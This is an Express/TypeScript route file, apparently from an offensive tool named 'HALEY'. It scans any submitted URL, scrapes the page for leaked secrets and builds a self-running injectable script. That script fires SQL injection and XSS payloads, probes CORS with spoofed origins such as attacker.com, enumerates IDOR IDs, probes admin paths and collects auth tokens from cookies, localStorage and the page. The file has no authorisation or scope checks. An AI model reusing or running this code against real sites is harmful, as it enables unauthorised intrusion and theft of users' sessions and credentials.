import { Router, type IRouter } from "express";
import { logger } from "../lib/logger";

const router: IRouter = Router();

interface VulnEntry { name: string; severity: string; }
interface SecretEntry { type: string; count: number; samples: string[]; }
interface CookieEntry { raw: string; httpOnly: boolean; secure: boolean; sameSite: string; }

function buildCustomToolCode(report: {
  url: string; tech: string[]; vulns: VulnEntry[]; forms: string[];
  endpoints: string[]; secrets: SecretEntry[];
}): string {
  const vulnList = report.vulns.map(v => `${v.severity}: ${v.name}`).join(", ") || "General";
  const tech = report.tech.join(", ") || "Unknown";

  return `// ═══════════════════════════════════════════════════════
// HALEY CUSTOM TOOL — Auto-built for: ${report.url}
// Tech Stack: ${tech}
// Vulnerabilities: ${vulnList}
// Generated: ${new Date().toISOString()}
// ═══════════════════════════════════════════════════════

const HALEY_CUSTOM_TOOL = {
  target: "${report.url}",
  tech: ${JSON.stringify(report.tech)},
  vulns: ${JSON.stringify(report.vulns.map(v => v.name))},
  forms: ${JSON.stringify(report.forms.slice(0, 5))},
  endpoints: ${JSON.stringify(report.endpoints.slice(0, 10))},

  async run() {
    console.log('[HALEY] Running custom tool for ${report.url.split("/")[2] || "target"}');
    const results = [];
    ${report.vulns.find(v => v.name.includes("SQL")) ? "results.push(await this.sqlTest());" : ""}
    ${report.vulns.find(v => v.name.includes("XSS")) ? "results.push(await this.xssTest());" : ""}
    ${report.vulns.find(v => v.name.includes("CORS")) ? "results.push(await this.corsExploit());" : ""}
    ${report.vulns.find(v => v.name.includes("IDOR")) ? "results.push(await this.idorTest());" : ""}
    ${report.secrets.length > 0 ? "results.push(await this.extractTokens());" : ""}
    results.push(await this.headerScan());
    results.push(await this.authTest());
    return results;
  },

  async sqlTest() {
    const payloads = ["'", "' OR '1'='1", "1 OR 1=1--", "' UNION SELECT NULL--", "admin'--"];
    const results = [];
    for (const form of ${JSON.stringify(report.forms.slice(0, 3))}) {
      for (const p of payloads) {
        try {
          const r = await fetch(form + "?id=" + encodeURIComponent(p), { credentials: "include" });
          const t = await r.text();
          if (/sql|mysql|syntax error|ORA-|SQLSTATE|Warning.*mysql/i.test(t)) {
            results.push({ CRITICAL: "SQLi CONFIRMED", form, payload: p });
          }
        } catch(e) {}
      }
    }
    return { tool: "SQL_INJECTION", results };
  },

  async xssTest() {
    const payloads = [
      '<script>alert("HALEY")</script>',
      '<img src=x onerror=alert(document.cookie)>',
      '"><script>alert(1)</script>',
      "javascript:alert(document.cookie)"
    ];
    const inputs = document.querySelectorAll("input, textarea");
    const results = [];
    for (const inp of inputs) {
      for (const p of payloads) {
        inp.value = p;
        inp.dispatchEvent(new Event("input", { bubbles: true }));
        results.push({ field: inp.name || inp.id, payload: p.slice(0,40) });
      }
    }
    return { tool: "XSS_TESTER", tested: results.length, results: results.slice(0,5) };
  },

  async corsExploit() {
    const origins = ["https://evil.haley.dreamland", "null", "https://attacker.com"];
    const results = [];
    for (const origin of origins) {
      try {
        const r = await fetch("${report.url}/api", {
          headers: { "Origin": origin },
          credentials: "include"
        });
        const allowed = r.headers.get("access-control-allow-origin");
        if (allowed) results.push({ origin, allowed, VULNERABLE: allowed === "*" || allowed === origin });
      } catch(e) {}
    }
    return { tool: "CORS_EXPLOIT", results };
  },

  async idorTest() {
    const url = window.location.href;
    const idMatch = url.match(/[?&](id|user_id|uid|order_id)=(\\d+)/);
    if (!idMatch) return { tool: "IDOR", note: "No ID param in URL" };
    const base = parseInt(idMatch[2]);
    const results = [];
    for (const id of [base-1, base+1, 1, 2, 100, 999]) {
      const testUrl = url.replace(idMatch[0], idMatch[0].replace(idMatch[2], String(id)));
      try {
        const r = await fetch(testUrl, { credentials: "include" });
        results.push({ id, status: r.status, IDOR: r.ok });
      } catch(e) {}
    }
    return { tool: "IDOR_TESTER", results };
  },

  async extractTokens() {
    const tokens = {};
    document.cookie.split(";").forEach(c => {
      const [k, v] = c.trim().split("=");
      if (/token|session|auth|jwt|key/i.test(k)) tokens["cookie_" + k] = v;
    });
    for (let i=0; i<localStorage.length; i++) {
      const k = localStorage.key(i);
      if (/token|session|auth|jwt|key|secret/i.test(k || "")) tokens["ls_" + k] = localStorage.getItem(k);
    }
    const jwtInPage = document.body?.innerHTML?.match(/eyJ[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+/g);
    if (jwtInPage) tokens["page_jwt"] = jwtInPage[0];
    return { tool: "TOKEN_EXTRACTOR", tokens };
  },

  async headerScan() {
    try {
      const r = await fetch("${report.url}", { method: "HEAD", credentials: "include" });
      const headers = {};
      r.headers.forEach((v, k) => { headers[k] = v; });
      return { tool: "HEADER_SCAN", headers, missing: {
        csp: !headers["content-security-policy"],
        hsts: !headers["strict-transport-security"],
        xframe: !headers["x-frame-options"],
        xxss: !headers["x-xss-protection"],
      }};
    } catch(e) { return { tool: "HEADER_SCAN", error: e.message }; }
  },

  async authTest() {
    const adminPaths = ["/admin", "/api/admin", "/dashboard", "/wp-admin", "/login", "/api/users", "/api/me"];
    const results = [];
    for (const path of adminPaths) {
      try {
        const r = await fetch("${report.url.split("/").slice(0,3).join("/")}" + path, { credentials: "include" });
        if (r.status !== 404) results.push({ path, status: r.status, accessible: r.ok });
      } catch(e) {}
    }
    return { tool: "AUTH_TESTER", results };
  },
};

// Auto-run when injected into page
if (typeof window !== "undefined") {
  window.HALEY_CUSTOM_TOOL = HALEY_CUSTOM_TOOL;
  HALEY_CUSTOM_TOOL.run().then(results => {
    console.table(results);
    if (typeof chrome !== "undefined" && chrome.runtime) {
      chrome.runtime.sendMessage({ type: "TOOL_RESULTS", tool: "custom_${report.url.split("/")[2] || "site"}", results });
    }
  });
}`;
}

router.post("/scan", async (req, res): Promise<void> => {
  const { url } = req.body as { url?: string };
  if (!url) {
    res.status(400).json({ error: "url required" });
    return;
  }

  let targetUrl = url.trim();
  if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
    targetUrl = "https://" + targetUrl;
  }

  try { new URL(targetUrl); } catch {
    res.status(400).json({ error: "Invalid URL" });
    return;
  }

  logger.info({ url: targetUrl }, "Starting deep scan");

  const report: {
    url: string;
    timestamp: string;
    status?: number;
    headers: Record<string, string>;
    tech: string[];
    forms: string[];
    endpoints: string[];
    jsFiles: string[];
    cookies: CookieEntry[];
    secrets: SecretEntry[];
    vulns: VulnEntry[];
    customToolCode: string;
  } = {
    url: targetUrl,
    timestamp: new Date().toISOString(),
    headers: {},
    tech: [],
    forms: [],
    endpoints: [],
    jsFiles: [],
    cookies: [],
    secrets: [],
    vulns: [],
    customToolCode: "",
  };

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);

    const response = await fetch(targetUrl, {
      signal: controller.signal,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
      },
    });
    clearTimeout(timeout);

    report.status = response.status;
    response.headers.forEach((v, k) => { report.headers[k] = v; });

    const html = await response.text();

    // Tech detection
    const techPatterns: Array<[string, RegExp]> = [
      ["WordPress", /wp-content|wp-login|wordpress/i],
      ["PHP", /\.php|PHPSESSID/i],
      ["React", /react\.min\.js|__reactroot|_next\//i],
      ["Angular", /ng-version|ng-app|angular/i],
      ["Vue.js", /vue\.js|__vue|v-bind/i],
      ["Laravel", /laravel_session|_token.*value/i],
      ["Django", /csrfmiddlewaretoken|django/i],
      ["Express.js", /x-powered-by.*express/i],
      ["ASP.NET", /ASP\.NET|\.aspx|ViewState/i],
      ["Ruby on Rails", /_session_id.*rails|authenticity_token/i],
      ["GraphQL", /graphql|__typename/i],
      ["Cloudflare", /cloudflare|cf-ray/i],
      ["Nginx", /nginx/i],
      ["Apache", /apache/i],
      ["JWT Auth", /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/],
      ["jQuery", /jquery/i],
      ["Bootstrap", /bootstrap/i],
      ["Next.js", /__NEXT_DATA__|_next\//i],
    ];
    const fullText = html + " " + JSON.stringify(report.headers);
    for (const [name, re] of techPatterns) {
      if (re.test(fullText)) report.tech.push(name);
    }

    // Form extraction
    const formMatches = html.match(/<form[^>]*action=["'](.*?)["']/gi) || [];
    report.forms = formMatches
      .map(f => f.match(/action=["'](.*?)["']/i)?.[1] ?? "")
      .filter(Boolean)
      .slice(0, 20);

    // Endpoint + JS extraction
    const links = html.match(/href=["'](\/[^"'?#]{1,100})["']/gi) || [];
    const srcs = html.match(/src=["'](\/[^"'?#]{1,100}\.js)["']/gi) || [];
    report.endpoints = [...new Set([
      ...links.map(l => l.match(/href=["'](.*?)["']/i)?.[1] ?? ""),
      ...srcs.map(s => s.match(/src=["'](.*?)["']/i)?.[1] ?? ""),
    ].filter(Boolean))].slice(0, 30);
    report.jsFiles = srcs.map(s => s.match(/src=["'](.*?)["']/i)?.[1] ?? "").filter(Boolean).slice(0, 15);

    // Secret scanning
    const secretPatterns: Array<{ name: string; re: RegExp }> = [
      { name: "API Key", re: /['"]?api[_-]?key['"]?\s*[:=]\s*['"]([^'"]{10,})['"]/gi },
      { name: "Bearer Token", re: /Bearer\s+([A-Za-z0-9\-._~+/]+=*)/g },
      { name: "JWT Token", re: /eyJ[A-Za-z0-9-_]{10,}\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g },
      { name: "Password", re: /['"]?password['"]?\s*[:=]\s*['"]([^'"]{4,})['"]/gi },
      { name: "Secret Key", re: /secret[_-]?key\s*[:=]\s*['"]([^'"]{8,})['"]/gi },
      { name: "DB Connection", re: /mongodb(\+srv)?:\/\/[^\s'"<>]+/gi },
      { name: "Stripe Live Key", re: /sk_live_[A-Za-z0-9]{20,}/g },
      { name: "AWS Access Key", re: /AKIA[0-9A-Z]{16}/g },
      { name: "GitHub Token", re: /ghp_[A-Za-z0-9]{36}/g },
      { name: "Private Key", re: /-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY/g },
    ];
    for (const { name, re } of secretPatterns) {
      const matches = [...html.matchAll(re)];
      if (matches.length > 0) {
        report.secrets.push({
          type: name,
          count: matches.length,
          samples: matches.slice(0, 3).map(m => m[0].slice(0, 80)),
        });
      }
    }

    // Vulnerability surface
    const vulnChecks: Array<{ name: string; condition: boolean; severity: string }> = [
      { name: "XSS Surface (input forms)", condition: /<input/i.test(html) && !report.headers["content-security-policy"], severity: "HIGH" },
      { name: "CORS Wildcard (*)", condition: report.headers["access-control-allow-origin"] === "*", severity: "HIGH" },
      { name: "No Content-Security-Policy", condition: !report.headers["content-security-policy"], severity: "MEDIUM" },
      { name: "No HSTS", condition: !report.headers["strict-transport-security"], severity: "MEDIUM" },
      { name: "No X-Frame-Options (Clickjacking)", condition: !report.headers["x-frame-options"], severity: "MEDIUM" },
      { name: "SQL Injection Surface", condition: /[?&](id|user_id|product_id|item_id|order_id)=\d/i.test(targetUrl) || /id=|user=|query=/i.test(html), severity: "HIGH" },
      { name: "Open Redirect Vector", condition: /redirect_uri|return_url|next=|callback=|redirect=/i.test(html), severity: "MEDIUM" },
      { name: "File Upload Endpoint", condition: /type=["']?file|enctype.*multipart|upload/i.test(html), severity: "HIGH" },
      { name: "Admin Panel Exposed", condition: /wp-admin|\/admin\/|\/dashboard\/|phpmyadmin/i.test(html + targetUrl), severity: "CRITICAL" },
      { name: "Error/Stack Trace Exposed", condition: /stack trace|exception at|Warning:|Notice:|Fatal error/i.test(html), severity: "MEDIUM" },
      { name: "GraphQL Introspection", condition: /graphql|__schema|__typename/i.test(html), severity: "HIGH" },
      { name: "JWT Exposed in Page", condition: /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/.test(html), severity: "CRITICAL" },
      { name: "No X-XSS-Protection", condition: !report.headers["x-xss-protection"], severity: "LOW" },
      { name: "Server Version Disclosed", condition: !!(report.headers["server"] && /\d\.\d/.test(report.headers["server"])), severity: "LOW" },
      { name: "Debug Mode ON", condition: /debug.*true|APP_DEBUG.*true|DEBUG.*=.*True/i.test(html), severity: "CRITICAL" },
    ];
    report.vulns = vulnChecks.filter(v => v.condition);

    // Cookie analysis
    const cookieRaw = report.headers["set-cookie"] || "";
    if (cookieRaw) {
      report.cookies = [{
        raw: cookieRaw.slice(0, 300),
        httpOnly: /httponly/i.test(cookieRaw),
        secure: /;\s*secure/i.test(cookieRaw),
        sameSite: cookieRaw.toLowerCase().match(/samesite=(\w+)/)?.[1] ?? "None",
      }];
    }

    // Build custom tool
    report.customToolCode = buildCustomToolCode(report);

    logger.info({ url: targetUrl, vulns: report.vulns.length, secrets: report.secrets.length }, "Scan complete");
    res.json({ ok: true, report });

  } catch (err) {
    const msg = err instanceof Error ? err.message : "Unknown error";
    logger.error({ err, url: targetUrl }, "Scan failed");
    res.status(500).json({ ok: false, error: msg, report: { ...report, error: msg } });
  }
});

export default router;
